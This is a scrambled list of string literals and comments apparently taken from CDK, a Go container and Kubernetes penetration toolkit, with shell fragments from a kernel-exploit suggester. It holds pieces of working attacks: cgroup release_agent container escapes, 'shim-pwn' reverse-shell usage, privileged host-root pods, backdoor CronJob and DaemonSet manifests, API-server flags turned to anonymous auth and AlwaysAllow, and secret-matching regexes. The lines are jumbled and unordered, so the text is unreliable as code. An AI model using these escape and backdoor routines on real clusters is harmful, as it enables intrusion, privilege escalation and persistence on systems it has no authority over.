" sleep 99999999""]"
" src_url=""https://www.exploit-db.com/download/$EXPLOIT_DB"""
" strings.Contains(fileInfo.Mode().String(), ""x"") {"
" strings.Contains(lines[i], ""[CVE"") {"
" strings.Contains(m.Fstype, ""ext"") {"
" strings.Contains(resp, ""APIGroupList"") {"
" strings.Contains(resp, ""kube-system"") {"
" strings.Contains(string(data), ""/run/user/"") {"
" strings.Replace(u.Host, "":"""
" subSystemName == """" {"
" tag_pkg_num=$(echo ""$tag_distro_num_all"" "
" tags=""${TAGS:6}"""
" tags=""${tags%"
" tags=""-"""
" targetDir == """" {"
" time.Millisecond,"
" time.Second,"
" to get evaluate info and a recommend exploit, then run "
" tr "","" """
" tr -d '""')"
" trim ',' added by above loop"
" unix.CLONE_NEWCGROUP,"
" using docker, make sure the user inside container is root."
" using perf_events, i915_perf and other kernel subsystems"
" util.StringContains(args, ""force-fuzz"") {"
" util.StringContains(m.Opts, ""rw""){"
" write privilege,  usage: "
"!/proc/self/exe"")"
""" != ""0"" ]"
""" (the shell payload will run by docker host)."")"
""" >> %s"", header, shellcmd, crontab)"
""" in former err output, means exploit success."")"
""" or "
""" to devices.allow failed."
""""", """
""""", -1) // escape shell cmd"
""""", filterString)"
""""".format("
"""$SECRET_PARAM"
"""',  "
"""(core dumped)"
""")"","
""").FindString(v)"
""", this exploit will spawn a cmd. "")"
"""-shadow"
"""."")"
"""./cdk run shim-pwn reverse <RHOST> <RPORT>"
"""./cmd shim-pwn <SHELL_CMD>"
"""/bin"","
"""/cgroup.procs"", []byte(strconv.Itoa(addProcCmd.Process.Pid)), 0644)"
"""/config.json"", []byte(configJson), 0666)"
"""/exe"", os.O_RDONLY, 0777)"
"""/host/"": {}"
"""/notify_on_release"", []byte(""1""), 0644)"
"""/release_agent"", []byte(hostPath"
"""/sbin"","
"""/snap/bin"","
"""/start"", """")"
"""/usr/bin"","
"""/usr/games"","
"""/usr/local/bin"","
"""/usr/local/games"","
"""/usr/local/sbin"","
"""/usr/sbin"","
"""00000000a80425fb"": ""CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP"","
"""00000000a80c25fb"" : ""CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_SYS_PTRACE,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP"","
"""00000000a82425fb"": ""CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_SYS_ADMIN,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP"","
"""1"": {"
"""1024 65535"
"""2"": {"
"""3"": {"
""": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]"
""":[{"
""":true}"", bzero, b64key)"
""":{},"
"""<shell-payload>"
"""AWS API Key"":                  ""AKIA[A-Z0-9]{16}"","
"""AttachStderr"": true,"
"""AttachStdin"": true,"
"""AttachStdout"": true,"
"""Binds"": [""/:/host""]"
"""CAP_AUDIT_CONTROL"","
"""CAP_AUDIT_READ"","
"""CAP_AUDIT_WRITE"","
"""CAP_BLOCK_SUSPEND"","
"""CAP_BPF"","
"""CAP_CHECKPOINT_RESTORE"","
"""CAP_CHOWN"","
"""CAP_DAC_OVERRIDE"","
"""CAP_DAC_READ_SEARCH"","
"""CAP_FOWNER"","
"""CAP_FSETID"","
"""CAP_IPC_LOCK"","
"""CAP_IPC_OWNER"","
"""CAP_KILL"","
"""CAP_LEASE"","
"""CAP_LINUX_IMMUTABLE"","
"""CAP_MAC_ADMIN"","
"""CAP_MAC_OVERRIDE"","
"""CAP_MKNOD"","
"""CAP_NET_ADMIN"","
"""CAP_NET_BIND_SERVICE"","
"""CAP_NET_BROADCAST"","
"""CAP_NET_RAW"","
"""CAP_PERFMON"","
"""CAP_SETFCAP"","
"""CAP_SETGID"","
"""CAP_SETPCAP"","
"""CAP_SETUID"","
"""CAP_SYSLOG"","
"""CAP_SYS_ADMIN"","
"""CAP_SYS_BOOT"","
"""CAP_SYS_CHROOT"","
"""CAP_SYS_MODULE"","
"""CAP_SYS_NICE"","
"""CAP_SYS_PACCT"","
"""CAP_SYS_PTRACE"","
"""CAP_SYS_RAWIO"","
"""CAP_SYS_RESOURCE"","
"""CAP_SYS_TIME"","
"""CAP_SYS_TTY_CONFIG"","
"""CAP_WAKE_ALARM"","
"""CMD"": [""/bin/sh"",""-c"",""<SHELL_CMD>""]"
"""Domainname"": """","
"""Entrypoint"": """","
"""Facebook Oauth"":               ""[f"
"""Generic API Key"":              ""[a"
"""Generic Secret"":               ""[s"
"""GitHub"":                       ""[g"
"""Google (GCP) Service-account"": """
"""Google Oauth"":                 ""("
"""Heroku API Key"":               ""[h"
"""HostConfig"": {"
"""Hostname"": """","
"""Image"": ""alpine"","
"""OpenStdin"": true,"
"""Options:"","
"""PGP private key block"":        ""-----BEGIN PGP PRIVATE KEY BLOCK-----"","
"""Password in URL"":              ""[a-zA-Z]{3,10}://["
"""Pod"
"""RSA private key"":              ""-----BEGIN RSA PRIVATE KEY-----"","
"""SSH (DSA) private key"":        ""-----BEGIN DSA PRIVATE KEY-----"","
"""SSH (EC) private key"":         ""-----BEGIN EC PRIVATE KEY-----"","
"""SSH (OPENSSH) private key"":    ""-----BEGIN OPENSSH PRIVATE KEY-----"","
"""Slack Token"":                  ""(xox[p"
"""Slack Webhook"":                ""https://hooks"
"""StdinOnce"": true,"
"""Tty"": false,"
"""Twilio API Key"":               ""SK[a-z0-9]{32}"","
"""Twitter Oauth"":                ""[t"
"""Usage:"","
"""User"": """","
"""Volumes"": {"
"""[a-zA-Z0-9-_]{24}"
"""add"": [""NET_ADMIN"", ""SYS_ADMIN"", ""SYS_PTRACE"", ""AUDIT_CONTROL"", ""MKNOD"", ""SETFCAP""]"
"""annotations"
"""annotations"": {},"
"""apache"","
"""apache2"","
"""apiVersion"
"""apiVersion"": ""${API_VERSION}"","
"""apiVersion"": ""batch/v1beta1"","
"""apiVersion"": ""v1"","
"""apt"","
"""args"": [""-c"", ""apt update "
"""args"": [""/bin/sh"", ""-c"", ""$SHELL_CMD""],"
"""args"": [""/bin/sh"", ""-c"", ""${SHELL_CMD}""],"
"""automountServiceAccountToken"": true,"
"""base64"","
"""bufio"""
"""bytes"""
"""cAdvisor"":            ""4194"","
"""capabilities"": {"
"""capsh"","
"""cdxy-test-2021"
"""client_secret"
"""code"":403"
"""command"": [""/bin/sh""],"
"""command""["
"""container"
"""containers"
"""containers"": [{"
"""context"""
"""crypto/tls"""
"""crypto/x509"""
"""curl"","
"""dashboard"":           ""30000"","
"""debugfs -w host_dev"
"""default"
"""docker"","
"""docker-api"":          ""2375"","
"""dpkg"","
"""encoding/base64"""
"""encoding/binary"""
"""encoding/json"""
"""errors"""
"""etcd"":                ""2379"","
"""fdisk"","
"""find"","
"""flag"""
"""fmt"""
"""gcc"","
"""git"","
"""gitVersion"":."
"""github.com/axgle/mahonia"""
"""github.com/bkthomps/Ven/screen"""
"""github.com/cdk-team/CDK/conf"""
"""github.com/cdk-team/CDK/pkg/cli"""
"""github.com/cdk-team/CDK/pkg/errors"""
"""github.com/cdk-team/CDK/pkg/evaluate"""
"""github.com/cdk-team/CDK/pkg/exploit/base"""
"""github.com/cdk-team/CDK/pkg/exploit/escaping"""
"""github.com/cdk-team/CDK/pkg/exploit/persistence"""
"""github.com/cdk-team/CDK/pkg/plugin"""
"""github.com/cdk-team/CDK/pkg/tool/dockerd_api"""
"""github.com/cdk-team/CDK/pkg/tool/etcdctl"""
"""github.com/cdk-team/CDK/pkg/tool/kubectl"""
"""github.com/cdk-team/CDK/pkg/tool/netcat"""
"""github.com/cdk-team/CDK/pkg/tool/netstat"""
"""github.com/cdk-team/CDK/pkg/tool/network"""
"""github.com/cdk-team/CDK/pkg/tool/probe"""
"""github.com/cdk-team/CDK/pkg/tool/ps"""
"""github.com/cdk-team/CDK/pkg/tool/vi"""
"""github.com/cdk-team/CDK/pkg/util"""
"""github.com/cdk-team/CDK/pkg/util/capability"""
"""github.com/containerd/ttrpc"""
"""github.com/docopt/docopt-go"""
"""github.com/fatih/color"""
"""github.com/gdamore/tcell"""
"""github.com/gdamore/tcell/encoding"""
"""github.com/hashicorp/go-version"""
"""github.com/idoubi/goz"""
"""github.com/shirou/gopsutil/v3/disk"""
"""github.com/shirou/gopsutil/v3/host"""
"""github.com/shirou/gopsutil/v3/net"""
"""github.com/shirou/gopsutil/v3/process"""
"""github.com/stretchr/testify/assert"""
"""github.com/tidwall/gjson"""
"""github.com/tidwall/sjson"""
"""golang.org/x/sync/semaphore"""
"""golang.org/x/sys/unix"""
"""hostNetwork"": true,"
"""hostPID"": true,"
"""hostPath"": {"
"""http"":                ""80"","
"""http-1"":              ""8080"","
"""httpd"","
"""https"":               ""443"","
"""https-1"":             ""8443"","
"""image"
"""image"": ""$IMAGE"","
"""image"": ""${IMAGE}"","
"""image"": ""ubuntu"","
"""imagePullPolicy"": ""IfNotPresent"","
"""io"""
"""io/ioutil"""
"""ip addr"
"""java"","
"""jobTemplate"": {"
"""k8s-api-server"":      ""6443"","
"""k8s-app"": ""${K8S_APP}"""
"""key"
"""keys_only"
"""kind"
"""kind"": ""CronJob"","
"""kind"": ""DaemonSet"","
"""kind"": ""Pod"","
"""kube-apiserver"")(["
"""kubectl"","
"""kubectl-proxy"":       ""8001"","
"""kubelet-auth"":        ""10250"","
"""kubelet-read"":        ""10255"","
"""labels"": {"
"""log"""
"""make"","
"""matchLabels"": {"
"""math/rand"""
"""metadata"
"""metadata"": {"
"""metadata"":{""name"":""(kube-apiserver"
"""mount"","
"""mountPath"": ""/host-root"","
"""mysql"","
"""mysql-client"","
"""name"
"""name"": ""cdk-backdoor-cronjob"""
"""name"": ""cdk-backdoor-cronjob-container"""
"""name"": ""cdk-backdoor-daemonset"""
"""name"": ""cdk-backdoor-pod"","
"""name"": ""cdk-rbac-bypass-create-pod"","
"""name"": ""host-volume"""
"""name"": ""ubuntu"""
"""namespace"
"""namespace"""
"""namespace"": ""kube-system"""
"""nc"","
"""net"""
"""net/http"""
"""net/url"""
"""netcat"","
"""nginx"","
"""node"","
"""nodeport-service"":    ""30001-32767"", //default NodePort service port range"
"""npm"","
"""os"""
"""os/exec"""
"""os/signal"""
"""os/user"""
"""path"""
"""path"": ""/"""
"""path/filepath"""
"""perl"","
"""php"","
"""privileged"": true"
"""ps"","
"""python"","
"""python2"","
"""python2.7"","
"""python3"","
"""range_end"
"""regexp"""
"""restartPolicy"": ""Always"","
"""restartPolicy"": ""OnFailure"""
"""ruby"","
"""runtime"""
"""schedule"": ""$SCHEDULE_EXPR"""
"""securityContext"": {"
"""selector"": {"
"""serviceAccountName"": ""${TARGET_SERVICE_ACCOUNT}"""
"""serviceAccountName"": ""admin"""
"""service_account"
"""shadow"")"
"""shell-cmd-payloads"
"""sort"""
"""spec"
"""spec"": {"
"""ssh"","
"""ssh"":                 ""22"","
"""strconv"""
"""strings"""
"""sudo"","
"""svn"","
"""sync"""
"""syscall"""
"""template"": {"
"""testing"""
"""text/tabwriter"""
"""tiller,weave,calico"": ""44134"","
"""time"""
"""touch /host/tmp/pwn-success"
"""touch /tmp/auto-docker-sock"
"""touch /tmp/auto-priv-cgroup"
"""touch /tmp/auto-priv-mountdir"
"""touch /tmp/auto-shimpwn"
"""touch /tmp/exploit_success"
"""touch /tmp/mount-cgroup-success"
"""touch /tmp/mount-procfs-success"
"""touch /tmp/shim-pwn-success"
"""type"
"""ubuntu:latest"
"""vi"","
"""volumeMounts"": [{"
"""volumes"": [{"
"""wget"","
"""xterm"","
"""yum"","
"""{} {}"
"""}"", b64key)"
"""},{""name"":""aliyun-acr-credential-helper-token-jlc5m"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ps -ef "
"""}]}}"
"$ > /mnt/cgrp1/x/cgroup.procs"""
"$ > /tmp/cgrp/cdk/cgroup.procs"""
"$)"")"
"${1}""--allow-privileged=true"",${2}"
"${1}""--anonymous-auth=true"",${2}"
"${1}""--authorization-mode=AlwaysAllow"",${2}"
"${1}""--insecure-bind-address=0.0.0.0"",${2}"
"${1}""--insecure-port=9443"",${2}"
"${1}""--secure-port=9444"",${2}"
"%s/cmd_%s"", dockerPath, randKey)"
"' ""$pkglist_file"" "
"'''.strip().format(CDK.BUILD_PATH,version)"
"')"",""field"":""metadata.labels""}]},""code"":422}"
"')"",""reason"":""Invalid"",""details"":{""name"":""kube-apiserver-10.206.0.11-shadow"",""kind"":""Pod"",""causes"":[{""reason"":""FieldValueInvalid"",""message"":""Invalid value: "
"'i ""$pkglist_file"" "
"( ""$OS"" == ""$tag_distro"" -a ""$(echo ""$DISTRO"" "
"("")(--audit-log-["
"(""--allow-privileged"
"(""--anonymous-auth"
"(""--authorization-mode"
"(""--insecure-bind-address"
"(""--insecure-port"
"(""--secure-port"
")("")"
")(""--etcd-keyfile=["
",     // docker socket (http)"
",   // containerd-shim socket (grpc)"
", // containerd socket (grpc)"
", sysctl entries, custom Bash commands): $([ ""$opt_skip_more_checks"" == ""false"" ] "
", use ""misc"""
", util.GreenBold.Sprint(BannerTitle), BannerVersion)"
", which is default after linux 5.10 for most distros"
", you can use the following method to deliver CDK:"
",${SED_RED},g"""
",bootstrapsigner,tokencleaner"",""--horizontal-pod-autoscaler-use-rest-clients=true"",""--kubeconfig=/etc/kubernetes/controller-manager.conf"",""--leader-elect=true"",""--node-cidr-mask-size=26"",""--profiling=false"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--root-ca-file=/etc/kubernetes/pki/ca.crt"",""--service-account-private-key-file=/etc/kubernetes/pki/sa.key"",""--service-cluster-ip-range=172.21.0.0/20"",""--use-service-account-credentials=true""],""resources"":{""requests"":{""cpu"":""200m""}},""volumeMounts"":[{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""kubeconfig"",""readOnly"":true,""mountPath"":""/etc/kubernetes/controller-manager.conf""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10252,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:24Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:27Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:27Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:24Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-09-10T07:23:24Z"",""containerStatuses"":[{""name"":""kube-controller-manager"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:26Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:05:10Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://11c5e8dbbffb6d1cc601d211be42873542271ac87073dd1461ea6d6553c0c138""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager@sha256:ec269c6046cc283c5e0c80c19722310ed1f29f9fccde8c89a08b294222ff5441"",""containerID"":""docker://204a05eafbbe413fba42031de977db911a80032a2dcdaa7883211eb662bc551a"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-controller-manager-cn-beijing.192.168.0.151"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-controller-manager-cn-beijing.192.168.0.151"",""uid"":""a5b5c25d-922a-4499-b2ae-dad9f083aad8"",""resourceVersion"":""487"",""creationTimestamp"":""2020-04-08T04:06:53Z"",""labels"":{""component"":""kube-controller-manager"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""113cd782cb781eb2fdff73f2820a21d7"",""kubernetes.io/config.mirror"":""113cd782cb781eb2fdff73f2820a21d7"",""kubernetes.io/config.seen"":""2020-04-08T12:06:53.045574636"
",bootstrapsigner,tokencleaner"",""--horizontal-pod-autoscaler-use-rest-clients=true"",""--kubeconfig=/etc/kubernetes/controller-manager.conf"",""--leader-elect=true"",""--node-cidr-mask-size=26"",""--profiling=false"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--root-ca-file=/etc/kubernetes/pki/ca.crt"",""--service-account-private-key-file=/etc/kubernetes/pki/sa.key"",""--service-cluster-ip-range=172.21.0.0/20"",""--use-service-account-credentials=true""],""resources"":{""requests"":{""cpu"":""200m""}},""volumeMounts"":[{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""kubeconfig"",""readOnly"":true,""mountPath"":""/etc/kubernetes/controller-manager.conf""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10252,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.151"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:57Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:59Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:59Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:57Z""}],""hostIP"":""192.168.0.151"",""podIP"":""192.168.0.151"",""podIPs"":[{""ip"":""192.168.0.151""}],""startTime"":""2020-04-08T04:06:57Z"",""containerStatuses"":[{""name"":""kube-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:06:58Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager@sha256:ec269c6046cc283c5e0c80c19722310ed1f29f9fccde8c89a08b294222ff5441"",""containerID"":""docker://85456ba47f9dd887c4ba158fc86885e8cd52dbf662c10dbbe5682d0f0ddcb2d4"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-controller-manager-cn-beijing.192.168.0.152"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-controller-manager-cn-beijing.192.168.0.152"",""uid"":""c50a4e85-b1de-41af-b9f5-59d5ee5f68f9"",""resourceVersion"":""914"",""creationTimestamp"":""2020-04-08T04:10:02Z"",""labels"":{""component"":""kube-controller-manager"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""113cd782cb781eb2fdff73f2820a21d7"",""kubernetes.io/config.mirror"":""113cd782cb781eb2fdff73f2820a21d7"",""kubernetes.io/config.seen"":""2020-04-08T12:08:40.982081019"
",bootstrapsigner,tokencleaner"",""--horizontal-pod-autoscaler-use-rest-clients=true"",""--kubeconfig=/etc/kubernetes/controller-manager.conf"",""--leader-elect=true"",""--node-cidr-mask-size=26"",""--profiling=false"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--root-ca-file=/etc/kubernetes/pki/ca.crt"",""--service-account-private-key-file=/etc/kubernetes/pki/sa.key"",""--service-cluster-ip-range=172.21.0.0/20"",""--use-service-account-credentials=true""],""resources"":{""requests"":{""cpu"":""200m""}},""volumeMounts"":[{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""kubeconfig"",""readOnly"":true,""mountPath"":""/etc/kubernetes/controller-manager.conf""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10252,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.152"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:46Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:46Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""}],""hostIP"":""192.168.0.152"",""podIP"":""192.168.0.152"",""podIPs"":[{""ip"":""192.168.0.152""}],""startTime"":""2020-04-08T04:08:44Z"",""containerStatuses"":[{""name"":""kube-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:08:45Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager@sha256:ec269c6046cc283c5e0c80c19722310ed1f29f9fccde8c89a08b294222ff5441"",""containerID"":""docker://3d16ef6d38358857f4aab186e73dec8f0c7339453540de0425b74aaa20395855"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-flannel-ds-5mdcn"",""generateName"":""kube-flannel-ds-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-5mdcn"",""uid"":""7b681bd4-c3f8-4d8f-81ef-914b39f6af3e"",""resourceVersion"":""35736460"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""app"":""flannel"",""controller-revision-hash"":""5d9fd8ccf4"",""pod-template-generation"":""1"",""tier"":""node""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-flannel-ds"",""uid"":""70b7a644-8470-4500-9408-50e20a4a0bc5"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""run"",""hostPath"":{""path"":""/run"",""type"":""""}},{""name"":""cni"",""hostPath"":{""path"":""/etc/cni/net.d"",""type"":""""}},{""name"":""flannel-cfg"",""configMap"":{""name"":""kube-flannel-cfg"",""defaultMode"":420}},{""name"":""flannel-token-pblrl"",""secret"":{""secretName"":""flannel-token-pblrl"",""defaultMode"":420}}],""initContainers"":[{""name"":""install-cni"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/bin/sh"",""-c"",""set -e -x"
"- [Briefing: ""Attack Cloud Native Kubernetes""](https://conference.hitb.org/hitbsecconf2021ams/sessions/attacking-cloud-native-kubernetes-with-cdk/)"
"-$"" "
"---------- upload CDK to ECS, ACK, Selfbuild-K8s ----------"
"--kernel and --checksec are mutually exclusive. Aborting."""
"--kernel and --cvelist-file are mutually exclusive. Aborting."""
"--kernel are mutually exclusive. Aborting."""
"--pkglist-file and --checksec are mutually exclusive. Aborting."""
"--pkglist-file and --cvelist-file are mutually exclusive. Aborting."""
"--short are mutually exclusive. Aborting."""
"--uname and --checksec are mutually exclusive. Aborting."""
"--uname and --cvelist-file are mutually exclusive. Aborting."""
"-generic},ubuntu=(14.10"
".""))"
".' ""$pkglist_file"" "
"./cdk run lxcfs-rw"")"
"._]' ""$pkglist_file"" "
".com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}"","
".conf$"", m.Root)"
".sock"")"
"//     call must first be denied by writing ""deny"" to the"
"//   hence, the only available cgroup is RDMA"
"//   sh -c ""echo "
"//  We can not check the sysctl file in other distros, test in CentOS Linux release 8.4.2105 (Core)."
"//  the sysctl files(/proc/sys/kernel/unprivileged_userns_clone) only exist in Debian, Ubuntu."
"// ""io/ioutil"""
"// - create new process, add to new corresponding namespace, then exit."
"// ./cdk run lxcfs-rw ""filter-string"""
"// 2346 2345 0:261 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw"
"// ANSI escape code in output, reg can not match it"
"// But more precisely, check if any root cgroup is preferred."
"// Can not call cli.Args here, because it will cause ""import cycle""."
"// Device: filesystem-specific information or ""none""."
"// Example: Run ""kubectl version --client"""
"// Fstype: the filesystem type in the form ""type[.subtype]""."
"// If this is not working, we have to let this process sleep and"
"// Note: Do not include any empty line at the start of script, or it will fail."
"// Port 6443/https is requested by default. If the token is valid, the function return."
"// Sample ""9:devices:/docker/fc1413683c2976fa292c0b1e011224706c1ecc151bad9ceabc9cfcb8dce4ddbb"""
"// Sample2: 1659 1605 253:1 /var/lib/kubelet/pods/cc76265f-d44d-4624-91c8-6f6812f85c7e/etc-hosts /etc/hosts rw,noatime - ext4 /dev/vda1 rw"
"// Sample3: 52 36 0:47 / /sys/fs/cgroup/memory rw,nosuid,nodev,noexec,relatime shared:26 - cgroup cgroup rw,memory"
"// Sample: 36 35 98:0 /mnt1 /mnt2 rw,noatime master:1 - ext3 /dev/root rw,errors=continue"
"// When the DeployBackdoorDaemonset call fails and returns an error, it will still feedback true."
"// [inside container] ./cdk run abuse-unpriv-newns ""touch /hacked"""
"// and i_generation is always 0, so handle is always 0x0000000000000002"
"// by default, use ""rdma"" for kernel 4.x - 5.13, tested on 4.19/5.16"
"// by default, use memory cgroup."
"// case ""windows"":"
"// change note: anonymous-auth is not valid in k8s 1.22 and later, see https://github.com/cdk-team/CDK/issues/77"
"// check capabilites, like getcap -r /bin"
"// dataFromSliceOrFile returns data from the slice (if non-empty), or from the file,"
"// differing of Linux Kernel version, 5.13"
"// docopt let fok = true, so we need to check it"
"// drop dir, only scan files"
"// even in container, you should save to a writable path"
"// exit code might not be zero, but still succeed"
"// fix ""Flag --insecure-port has been deprecated, This flag has no effect now and will be removed in v1.24."""
"// fmt.Print and log.Print to buffer, and check output"
"// fmt.Printf(""["
"// fmt.Printf(util.GreenBold.Sprint("""
"// from v1.16 on, use apps/v1 instead of extensions/v1beta1"
"// get ""virtblk"" device ID"
"// get its PID, then manually execute the following commented code."
"// get sub string from buf, lenght is 1000"
"// hook fmt.X to buffer, hook os.Stdout"
"// if !bytes.Contains(buf.Bytes(), []byte(tt.successStr)) "
"// if !strings.Contains(json, ""--anonymous-auth"") {"
